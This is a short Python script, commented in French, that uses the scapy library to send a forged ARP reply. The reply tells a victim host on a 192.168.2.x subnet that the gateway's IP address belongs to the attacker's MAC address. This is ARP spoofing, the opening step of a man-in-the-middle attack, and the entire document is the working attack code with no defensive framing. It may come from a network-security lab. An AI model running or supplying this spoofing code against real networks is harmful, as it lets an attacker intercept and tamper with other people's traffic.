from scapy.all import *

# Adresse IP cible
victim = "192.168.2.160"

# Adresse MAC de l'attaquant
my_mac = "00:0c:29:f4:51:15"

# Adresse IP de la passerelle (routeur)
gateway = "192.168.2.219"

# Création du paquet ARP falsifié
fake_arp_packet = ARP(op=2, pdst=victim, hwdst=my_mac, psrc=gateway)

# Envoi du paquet
send(fake_arp_packet)
